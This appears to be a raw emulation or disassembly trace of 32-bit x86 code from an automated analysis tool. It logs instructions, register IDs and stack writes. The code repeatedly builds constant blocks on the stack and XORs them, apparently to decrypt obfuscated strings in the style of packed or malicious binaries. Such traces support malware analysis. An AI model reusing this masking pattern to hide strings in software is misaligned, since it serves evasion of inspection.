1 0x45a227: push eax, regs_read: [30, 19], regs_write: [30] 0x45a228: movaps xmmword ptr [esp + 0x44], xmm0, regs_read: [30, 122], regs_write: () adjusting stack for ESP -0x68 and offset 0x8044 for stack size 0x10000 saving data to stack: 110050094701684156470740787121369833863 16 0x45a23a: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45a23b: push dword ptr [esp + 0x1b0], regs_read: [30], regs_write: [30] 0x45a251: push ecx, regs_read: [30, 22], regs_write: [30] 0x45a252: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45a259: push eax, regs_read: [30, 19], regs_write: [30] 0x45a28f: push 0, regs_read: [30], regs_write: [30] 0x45a296: push eax, regs_read: [30, 19], regs_write: [30] 0x45a2a1: mov edx, 0x35694ee8, regs_read: (), regs_write: [24] 0x45a2a6: mov dword ptr [esp + 0x100], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x78 and offset 0x8100 for stack size 0x10000 saving data to stack: 914789047 4 0x45a2b1: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x45a2b6: mov dword ptr [esp + 0x104], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x78 and offset 0x8104 for stack size 0x10000 saving data to stack: 896093928 4 0x45a2bd: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45a2c2: mov dword ptr [esp + 0x108], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x78 and offset 0x8108 for stack size 0x10000 saving data to stack: 929680980 4 0x45a2c9: mov dword ptr [esp + 0x10c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x78 and offset 0x810c for stack size 0x10000 saving data to stack: 1389027477 4 0x45a2d0: movaps xmm1, xmmword ptr [esp + 0x100], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x78 and offset 0x8100 for stack size 0x10000 0x45a2d8: mov dword ptr [esp + 0x8c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x78 and offset 0x808c for stack size 0x10000 saving data to stack: 1389027477 4 0x45a2e6: mov dword ptr [esp + 0x84], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x78 and offset 0x8084 for stack size 0x10000 saving data to stack: 896093928 4 0x45a2f1: mov dword ptr [esp + 0x88], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x78 and offset 0x8088 for stack size 0x10000 saving data to stack: 929680980 4 0x45a2ff: mov dword ptr [esp + 0x80], 0x368692eb, regs_read: [30], regs_write: () adjusting stack for ESP -0x78 and offset 0x8080 for stack size 0x10000 saving data to stack: 914789099 4 0x45a30a: pxor xmm1, xmmword ptr [esp + 0x80], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x78 and offset 0x8080 for stack size 0x10000 0x45a313: push eax, regs_read: [30, 19], regs_write: [30] 0x45a314: movaps xmmword ptr [esp + 0x84], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x7c and offset 0x8084 for stack size 0x10000 saving data to stack: 92 16 0x45a329: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45a32a: push dword ptr [esp + 0xe8], regs_read: [30], regs_write: [30] 0x45a340: push ecx, regs_read: [30, 22], regs_write: [30] 0x45a341: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45a348: push eax, regs_read: [30, 19], regs_write: [30] 0x45a35c: push eax, regs_read: [30, 19], regs_write: [30] 0x45a39e: push 0, regs_read: [30], regs_write: [30] 0x45a3a5: push eax, regs_read: [30, 19], regs_write: [30] 0x45a3b8: mov esi, 0x52cae095, regs_read: (), regs_write: [29] 0x45a3c3: mov ecx, 0x35694ee8, regs_read: (), regs_write: [22] 0x45a3c8: mov dword ptr [esp + 0x110], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x90 and offset 0x8110 for stack size 0x10000 saving data to stack: 914789047 4 0x45a3d3: mov eax, 0x3769ce54, regs_read: (), regs_write: [19] 0x45a3d8: mov dword ptr [esp + 0x114], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x90 and offset 0x8114 for stack size 0x10000 saving data to stack: 896093928 4 0x45a3df: mov dword ptr [esp + 0x118], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x90 and offset 0x8118 for stack size 0x10000 saving data to stack: 929680980 4 0x45a3ea: mov dword ptr [esp + 0x98], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x90 and offset 0x8098 for stack size 0x10000 saving data to stack: 929680980 4 0x45a3f8: mov dword ptr [esp + 0x94], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x90 and offset 0x8094 for stack size 0x10000 saving data to stack: 896093928 4 0x45a406: mov dword ptr [esp + 0x11c], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x90 and offset 0x811c for stack size 0x10000 saving data to stack: 1389027477 4 0x45a40d: movaps xmm1, xmmword ptr [esp + 0x110], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x90 and offset 0x8110 for stack size 0x10000 0x45a415: mov dword ptr [esp + 0x90], 0x368692eb, regs_read: [30], regs_write: () adjusting stack for ESP -0x90 and offset 0x8090 for stack size 0x10000 saving data to stack: 914789099 4 0x45a420: mov dword ptr [esp + 0x9c], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x90 and offset 0x809c for stack size 0x10000 saving data to stack: 1389027477 4 0x45a427: pxor xmm1, xmmword ptr [esp + 0x90], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x90 and offset 0x8090 for stack size 0x10000 0x45a430: push eax, regs_read: [30, 19], regs_write: [30] 0x45a431: movaps xmmword ptr [esp + 0x94], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x94 and offset 0x8094 for stack size 0x10000 saving data to stack: 92 16 0x45a446: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45a447: push dword ptr [esp + 0x168], regs_read: [30], regs_write: [30] 0x45a45d: push ecx, regs_read: [30, 22], regs_write: [30] 0x45a45e: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45a465: push eax, regs_read: [30, 19], regs_write: [30] 0x45a49b: push 0, regs_read: [30], regs_write: [30] 0x45a4a2: push eax, regs_read: [30, 19], regs_write: [30] 0x45a4ad: push eax, regs_read: [30, 19], regs_write: [30] 0x45a4c7: mov dword ptr [esp + 0x120], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xa8 and offset 0x8120 for stack size 0x10000 saving data to stack: 914789047 4 0x45a4d9: mov dword ptr [esp + 0x124], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0xa8 and offset 0x8124 for stack size 0x10000 saving data to stack: 896093928 4 0x45a4e4: mov dword ptr [esp + 0x128], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0xa8 and offset 0x8128 for stack size 0x10000 saving data to stack: 929680980 4 0x45a4ef: mov dword ptr [esp + 0x12c], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0xa8 and offset 0x812c for stack size 0x10000 saving data to stack: 1389027477 4 0x45a4f6: movaps xmm1, xmmword ptr [esp + 0x120], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xa8 and offset 0x8120 for stack size 0x10000 0x45a4fe: mov dword ptr [esp + 0xa0], 0x53e2fcfe, regs_read: [30], regs_write: () adjusting stack for ESP -0xa8 and offset 0x80a0 for stack size 0x10000 saving data to stack: 1407384830 4 0x45a509: mov dword ptr [esp + 0xa4], 0x710d2b90, regs_read: [30], regs_write: () adjusting stack for ESP -0xa8 and offset 0x80a4 for stack size 0x10000 saving data to stack: 1896688528 4 0x45a514: mov dword ptr [esp + 0xa8], 0x3769ce16, regs_read: [30], regs_write: () adjusting stack for ESP -0xa8 and offset 0x80a8 for stack size 0x10000 saving data to stack: 929680918 4 0x45a51f: mov dword ptr [esp + 0xac], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0xa8 and offset 0x80ac for stack size 0x10000 saving data to stack: 1389027477 4 0x45a526: pxor xmm1, xmmword ptr [esp + 0xa0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xa8 and offset 0x80a0 for stack size 0x10000 0x45a52f: movaps xmmword ptr [esp + 0xa0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xa8 and offset 0x80a0 for stack size 0x10000 saving data to stack: 1222413284324852133449 16 0x45a541: mov eax, 0x3769ce54, regs_read: (), regs_write: [19] 0x45a548: mov ecx, 0x35694ee8, regs_read: (), regs_write: [22] 0x45a54d: mov dword ptr [esp + 0xb8], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xa8 and offset 0x80b8 for stack size 0x10000 saving data to stack: 929680980 4 0x45a554: mov dword ptr [esp + 0xb0], 0x55e8ebe4, regs_read: [30], regs_write: () adjusting stack for ESP -0xa8 and offset 0x80b0 for stack size 0x10000 saving data to stack: 1441328100 4 0x45a55f: mov dword ptr [esp + 0xb4], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xa8 and offset 0x80b4 for stack size 0x10000 saving data to stack: 896093928 4 0x45a566: mov dword ptr [esp + 0xbc], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0xa8 and offset 0x80bc for stack size 0x10000 saving data to stack: 1389027477 4 0x45a56d: movaps xmm1, xmmword ptr [esp + 0xb0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xa8 and offset 0x80b0 for stack size 0x10000 0x45a575: mov dword ptr [esp + 0x138], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xa8 and offset 0x8138 for stack size 0x10000 saving data to stack: 929680980 4 0x45a583: mov dword ptr [esp + 0x130], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xa8 and offset 0x8130 for stack size 0x10000 saving data to stack: 914789047 4 0x45a58e: mov dword ptr [esp + 0x134], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xa8 and offset 0x8134 for stack size 0x10000 saving data to stack: 896093928 4 0x45a595: mov dword ptr [esp + 0x13c], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0xa8 and offset 0x813c for stack size 0x10000 saving data to stack: 1389027477 4 0x45a59c: pxor xmm1, xmmword ptr [esp + 0x130], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xa8 and offset 0x8130 for stack size 0x10000 0x45a5a5: movaps xmmword ptr [esp + 0xb0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xa8 and offset 0x80b0 for stack size 0x10000 saving data to stack: 1668184403 16 0x45a5af: mov dword ptr [esp + 0xc8], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xa8 and offset 0x80c8 for stack size 0x10000 saving data to stack: 929680980 4 0x45a5b6: mov dword ptr [esp + 0xc0], 0x57e5fdfb, regs_read: [30], regs_write: () adjusting stack for ESP -0xa8 and offset 0x80c0 for stack size 0x10000 saving data to stack: 1474690555 4 0x45a5c1: mov dword ptr [esp + 0xc4], 0x35694e84, regs_read: [30], regs_write: () adjusting stack for ESP -0xa8 and offset 0x80c4 for stack size 0x10000 saving data to stack: 896093828 4 0x45a5cc: mov dword ptr [esp + 0xcc], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0xa8 and offset 0x80cc for stack size 0x10000 saving data to stack: 1389027477 4 0x45a5d3: movaps xmm1, xmmword ptr [esp + 0xc0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xa8 and offset 0x80c0 for stack size 0x10000 0x45a5db: mov dword ptr [esp + 0x148], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xa8 and offset 0x8148 for stack size 0x10000 saving data to stack: 929680980 4 0x45a5e9: mov dword ptr [esp + 0x140], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xa8 and offset 0x8140 for stack size 0x10000 saving data to stack: 914789047 4 0x45a5f4: mov dword ptr [esp + 0x144], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0xa8 and offset 0x8144 for stack size 0x10000 saving data to stack: 896093928 4 0x45a5ff: mov dword ptr [esp + 0x14c], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0xa8 and offset 0x814c for stack size 0x10000 saving data to stack: 1389027477 4 0x45a606: pxor xmm1, xmmword ptr [esp + 0x140], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xa8 and offset 0x8140 for stack size 0x10000 0x45a60f: movaps xmmword ptr [esp + 0xc0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xa8 and offset 0x80c0 for stack size 0x10000 saving data to stack: 465490374476 16 0x45a617: push eax, regs_read: [30, 19], regs_write: [30] 0x45a621: mov esi, eax, regs_read: [19], regs_write: [29] 0x45a623: mov dword ptr [esp + 0x70], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xac and offset 0x8070 for stack size 0x10000 saving data to stack: 914789047 4 0x45a62b: mov edx, 0x35694ee8, regs_read: (), regs_write: [24] 0x45a630: mov dword ptr [esp + 0x10], 0x368692eb, regs_read: [30], regs_write: () adjusting stack for ESP -0xac and offset 0x8010 for stack size 0x10000 saving data to stack: 914789099 4 0x45a638: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x45a63d: mov dword ptr [esp + 0x74], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xac and offset 0x8074 for stack size 0x10000 saving data to stack: 896093928 4 0x45a641: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45a646: mov dword ptr [esp + 0x78], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xac and offset 0x8078 for stack size 0x10000 saving data to stack: 929680980 4 0x45a64a: mov dword ptr [esp + 0x7c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xac and offset 0x807c for stack size 0x10000 saving data to stack: 1389027477 4 0x45a64e: movaps xmm1, xmmword ptr [esp + 0x70], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xac and offset 0x8070 for stack size 0x10000 0x45a653: mov dword ptr [esp + 0x1c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xac and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x45a65b: mov dword ptr [esp + 0x14], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xac and offset 0x8014 for stack size 0x10000 saving data to stack: 896093928 4 0x45a663: mov dword ptr [esp + 0x18], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xac and offset 0x8018 for stack size 0x10000 saving data to stack: 929680980 4 0x45a66e: pxor xmm1, xmmword ptr [esp + 0x10], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xac and offset 0x8010 for stack size 0x10000 0x45a674: push eax, regs_read: [30, 19], regs_write: [30] 0x45a675: movaps xmmword ptr [esp + 0x14], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xb0 and offset 0x8014 for stack size 0x10000 saving data to stack: 92 16 0x45a67f: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45a680: push esi, regs_read: [30, 29], regs_write: [30] 0x45a681: push eax, regs_read: [30, 19], regs_write: [30] 0x45a682: push dword ptr [esp + 0x14], regs_read: [30], regs_write: [30] 0x45a699: push eax, regs_read: [30, 19], regs_write: [30] 0x45a6e4: push 0, regs_read: [30], regs_write: [30] 0x45a6eb: push eax, regs_read: [30, 19], regs_write: [30] 0x45a6f9: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0xc4 and offset 0x8000 for stack size 0x10000 0x45a6fb: push eax, regs_read: [30, 19], regs_write: [30] 0x45a70b: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0xc8 and offset 0x8000 for stack size 0x10000 0x45a70d: push eax, regs_read: [30, 19], regs_write: [30] 0x45a724: push 1, regs_read: [30], regs_write: [30] 0x45a726: pop eax, regs_read: [30], regs_write: [30, 19] 0x45a72a: mov byte ptr [esp + 9], cl, regs_read: [30, 10], regs_write: () adjusting stack for ESP -0xcc and offset 0x8009 for stack size 0x10000 saving data to stack: 0 1 0x45a72e: mov esi, dword ptr [esp + 0x50], regs_read: [30], regs_write: [29] adjusting stack for ESP -0xcc and offset 0x8050 for stack size 0x10000 0x45a76b: mov ecx, dword ptr [0x4f0628], regs_read: (), regs_write: [22] 0x45a771: push 0x64, regs_read: [30], regs_write: [30] 0x45a773: pop eax, regs_read: [30], regs_write: [30, 19] 0x45a77a: mov eax, dword ptr [0x4f062c], regs_read: (), regs_write: [19] 0x45a781: mov dword ptr [esp + 0x50], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0xcc and offset 0x8050 for stack size 0x10000 saving data to stack: 0 4 0x45a794: mov esi, 0x52cae095, regs_read: (), regs_write: [29] 0x45a7a3: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0xcc and offset 0x8000 for stack size 0x10000 0x45a7a5: push eax, regs_read: [30, 19], regs_write: [30] 0x45a7be: push ecx, regs_read: [30, 22], regs_write: [30] 0x45a7cb: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45a7d9: mov eax, 0x3769ce54, regs_read: (), regs_write: [19] 0x45a7de: mov dword ptr [esp + 0x70], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xd0 and offset 0x8070 for stack size 0x10000 saving data to stack: 914789047 4 0x45a7e6: mov dword ptr [esp + 0x78], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xd0 and offset 0x8078 for stack size 0x10000 saving data to stack: 929680980 4 0x45a7f1: mov dword ptr [esp + 0x18], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xd0 and offset 0x8018 for stack size 0x10000 saving data to stack: 929680980 4 0x45a7f5: mov edx, 0x4f05f0, regs_read: (), regs_write: [24] 0x45a7fa: mov dword ptr [esp + 0x74], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0xd0 and offset 0x8074 for stack size 0x10000 saving data to stack: 896093928 4 0x45a806: mov dword ptr [esp + 0x7c], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0xd0 and offset 0x807c for stack size 0x10000 saving data to stack: 1389027477 4 0x45a80a: movaps xmm1, xmmword ptr [esp + 0x70], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xd0 and offset 0x8070 for stack size 0x10000 0x45a80f: mov dword ptr [esp + 0x10], 0x5ae7c5eb, regs_read: [30], regs_write: () adjusting stack for ESP -0xd0 and offset 0x8010 for stack size 0x10000 saving data to stack: 1525138923 4 0x45a817: mov dword ptr [esp + 0x14], 0x461d2b84, regs_read: [30], regs_write: () adjusting stack for ESP -0xd0 and offset 0x8014 for stack size 0x10000 saving data to stack: 1176316804 4 0x45a81f: mov dword ptr [esp + 0x1c], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0xd0 and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x45a823: pxor xmm1, xmmword ptr [esp + 0x10], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xd0 and offset 0x8010 for stack size 0x10000 0x45a829: push eax, regs_read: [30, 19], regs_write: [30] 0x45a82a: movaps xmmword ptr [esp + 0x14], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xd4 and offset 0x8014 for stack size 0x10000 saving data to stack: 8319385928009340764 16 0x45a843: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45a84c: push 0, regs_read: [30], regs_write: [30] 0x45a84e: push eax, regs_read: [30, 19], regs_write: [30] 0x45a859: mov eax, dword ptr [0x4f0708], regs_read: (), regs_write: [19] 0x45a860: mov ecx, dword ptr [0x4f0704], regs_read: (), regs_write: [22] 0x45a868: mov dword ptr [esp + 0x50], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xd8 and offset 0x8050 for stack size 0x10000 saving data to stack: 5178864 4 0x45a871: mov byte ptr [esp + 9], 0, regs_read: [30], regs_write: () adjusting stack for ESP -0xd8 and offset 0x8009 for stack size 0x10000 saving data to stack: 0 1 0x45a87e: mov dword ptr [esp + 0x7c], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0xd8 and offset 0x807c for stack size 0x10000 saving data to stack: 1389027477 4 0x45a884: mov dword ptr [esp + 0x70], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xd8 and offset 0x8070 for stack size 0x10000 saving data to stack: 914789047 4 0x45a88c: mov dword ptr [esp + 0x74], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0xd8 and offset 0x8074 for stack size 0x10000 saving data to stack: 896093928 4 0x45a894: mov dword ptr [esp + 0x78], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0xd8 and offset 0x8078 for stack size 0x10000 saving data to stack: 929680980 4 0x45a89c: mov dword ptr [esp + 0xc], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0xd8 and offset 0x800c for stack size 0x10000 saving data to stack: 1389027477 4 0x45a8ac: push eax, regs_read: [30, 19], regs_write: [30] 0x45a8b2: mov eax, dword ptr [0x4f0704], regs_read: (), regs_write: [19] 0x45a8c3: push eax, regs_read: [30, 19], regs_write: [30] 0x45a8c9: mov eax, dword ptr [0x4f0704], regs_read: (), regs_write: [19] 0x45a8da: push eax, regs_read: [30, 19], regs_write: [30] 0x45a8e0: mov eax, dword ptr [0x4f0704], regs_read: (), regs_write: [19] 0x45a8f1: push eax, regs_read: [30, 19], regs_write: [30] 0x45a8f7: mov eax, dword ptr [0x4f0704], regs_read: (), regs_write: [19] 0x45a903: movaps xmm1, xmmword ptr [esp + 0x70], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xe8 and offset 0x8070 for stack size 0x10000 0x45a908: mov dword ptr [esp + 0x10], 0x368692eb, regs_read: [30], regs_write: () adjusting stack for ESP -0xe8 and offset 0x8010 for stack size 0x10000 saving data to stack: 914789099 4 0x45a910: mov dword ptr [esp + 0x14], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0xe8 and offset 0x8014 for stack size 0x10000 saving data to stack: 896093928 4 0x45a918: mov cl, byte ptr [esi + eax + 1], regs_read: [29, 19], regs_write: [10] 0x45a91c: mov al, byte ptr [esi + eax], regs_read: [29, 19], regs_write: [2] 0x45a91f: mov byte ptr [esp + 0xb], al, regs_read: [30, 2], regs_write: () adjusting stack for ESP -0xe8 and offset 0x800b for stack size 0x10000 saving data to stack: 1 1 0x45a927: mov dword ptr [esp + 0x18], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0xe8 and offset 0x8018 for stack size 0x10000 saving data to stack: 929680980 4 0x45a92f: mov dword ptr [esp + 0x1c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0xe8 and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x45a937: pxor xmm1, xmmword ptr [esp + 0x10], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xe8 and offset 0x8010 for stack size 0x10000 0x45a93d: mov byte ptr [esp + 0xa], cl, regs_read: [30, 10], regs_write: () adjusting stack for ESP -0xe8 and offset 0x800a for stack size 0x10000 saving data to stack: 0 1 0x45a948: push eax, regs_read: [30, 19], regs_write: [30] 0x45a949: movaps xmmword ptr [esp + 0x14], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xec and offset 0x8014 for stack size 0x10000 saving data to stack: 133319729045342163077669014213738533611 16 0x45a95b: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45a95c: push dword ptr [esp + 0x1c8], regs_read: [30], regs_write: [30] 0x45a972: push ecx, regs_read: [30, 22], regs_write: [30] 0x45a973: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45a97a: push eax, regs_read: [30, 19], regs_write: [30] 0x45a9b0: push 0, regs_read: [30], regs_write: [30] 0x45a9b7: push eax, regs_read: [30, 19], regs_write: [30] 0x45a9c2: mov edx, 0x35694ee8, regs_read: (), regs_write: [24] 0x45a9c7: mov dword ptr [esp + 0x140], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xfc and offset 0x8140 for stack size 0x10000 saving data to stack: 914789047 4 0x45a9d2: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x45a9d7: mov dword ptr [esp + 0x144], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xfc and offset 0x8144 for stack size 0x10000 saving data to stack: 896093928 4 0x45a9de: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45a9e3: mov dword ptr [esp + 0x148], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xfc and offset 0x8148 for stack size 0x10000 saving data to stack: 929680980 4 0x45a9ea: mov dword ptr [esp + 0x14c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xfc and offset 0x814c for stack size 0x10000 saving data to stack: 1389027477 4 0x45a9f1: movaps xmm1, xmmword ptr [esp + 0x140], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xfc and offset 0x8140 for stack size 0x10000 0x45a9f9: mov dword ptr [esp + 0xcc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xfc and offset 0x80cc for stack size 0x10000 saving data to stack: 1389027477 4 0x45aa07: mov dword ptr [esp + 0xc4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xfc and offset 0x80c4 for stack size 0x10000 saving data to stack: 896093928 4 0x45aa12: mov dword ptr [esp + 0xc8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xfc and offset 0x80c8 for stack size 0x10000 saving data to stack: 929680980 4 0x45aa1d: mov dword ptr [esp + 0xc0], 0x368692eb, regs_read: [30], regs_write: () adjusting stack for ESP -0xfc and offset 0x80c0 for stack size 0x10000 saving data to stack: 914789099 4 0x45aa28: pxor xmm1, xmmword ptr [esp + 0xc0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xfc and offset 0x80c0 for stack size 0x10000 0x45aa31: push eax, regs_read: [30, 19], regs_write: [30] 0x45aa32: movaps xmmword ptr [esp + 0xc4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x100 and offset 0x80c4 for stack size 0x10000 saving data to stack: 92 16 0x45aa47: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45aa48: push dword ptr [esp + 0x1b0], regs_read: [30], regs_write: [30] 0x45aa5e: push ecx, regs_read: [30, 22], regs_write: [30] 0x45aa5f: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45aa66: push eax, regs_read: [30, 19], regs_write: [30] 0x45aa7a: push eax, regs_read: [30, 19], regs_write: [30] 0x45aab9: push 0, regs_read: [30], regs_write: [30] 0x45aac0: push eax, regs_read: [30, 19], regs_write: [30] 0x45aad3: mov esi, 0x52cae095, regs_read: (), regs_write: [29] 0x45aade: mov ecx, 0x35694ee8, regs_read: (), regs_write: [22] 0x45aae3: mov dword ptr [esp + 0xb0], 0x368692eb, regs_read: [30], regs_write: () adjusting stack for ESP -0x114 and offset 0x80b0 for stack size 0x10000 saving data to stack: 914789099 4 0x45aaee: mov eax, 0x3769ce54, regs_read: (), regs_write: [19] 0x45aaf3: mov dword ptr [esp + 0xb4], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x114 and offset 0x80b4 for stack size 0x10000 saving data to stack: 896093928 4 0x45aafa: mov dword ptr [esp + 0xb8], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x114 and offset 0x80b8 for stack size 0x10000 saving data to stack: 929680980 4 0x45ab05: mov dword ptr [esp + 0xbc], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x114 and offset 0x80bc for stack size 0x10000 saving data to stack: 1389027477 4 0x45ab0c: movaps xmm1, xmmword ptr [esp + 0xb0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x114 and offset 0x80b0 for stack size 0x10000 0x45ab14: mov dword ptr [esp + 0x134], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x114 and offset 0x8134 for stack size 0x10000 saving data to stack: 896093928 4 0x45ab22: mov dword ptr [esp + 0x138], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x114 and offset 0x8138 for stack size 0x10000 saving data to stack: 929680980 4 0x45ab30: mov dword ptr [esp + 0x130], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x114 and offset 0x8130 for stack size 0x10000 saving data to stack: 914789047 4 0x45ab3b: mov dword ptr [esp + 0x13c], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x114 and offset 0x813c for stack size 0x10000 saving data to stack: 1389027477 4 0x45ab42: pxor xmm1, xmmword ptr [esp + 0x130], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x114 and offset 0x8130 for stack size 0x10000 0x45ab4b: push eax, regs_read: [30, 19], regs_write: [30] 0x45ab4c: movaps xmmword ptr [esp + 0xb4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x118 and offset 0x80b4 for stack size 0x10000 saving data to stack: 92 16 0x45ab61: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45ab62: push dword ptr [esp + 0xe8], regs_read: [30], regs_write: [30] 0x45ab78: push ecx, regs_read: [30, 22], regs_write: [30] 0x45ab79: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45ab80: push eax, regs_read: [30, 19], regs_write: [30] 0x45abb6: push 0, regs_read: [30], regs_write: [30] 0x45abbd: push eax, regs_read: [30, 19], regs_write: [30] 0x45abc8: push eax, regs_read: [30, 19], regs_write: [30] 0x45abe2: mov dword ptr [esp + 0xa0], 0x53e2fcfe, regs_read: [30], regs_write: () adjusting stack for ESP -0x12c and offset 0x80a0 for stack size 0x10000 saving data to stack: 1407384830 4 0x45abf4: mov dword ptr [esp + 0xa4], 0x710d2b90, regs_read: [30], regs_write: () adjusting stack for ESP -0x12c and offset 0x80a4 for stack size 0x10000 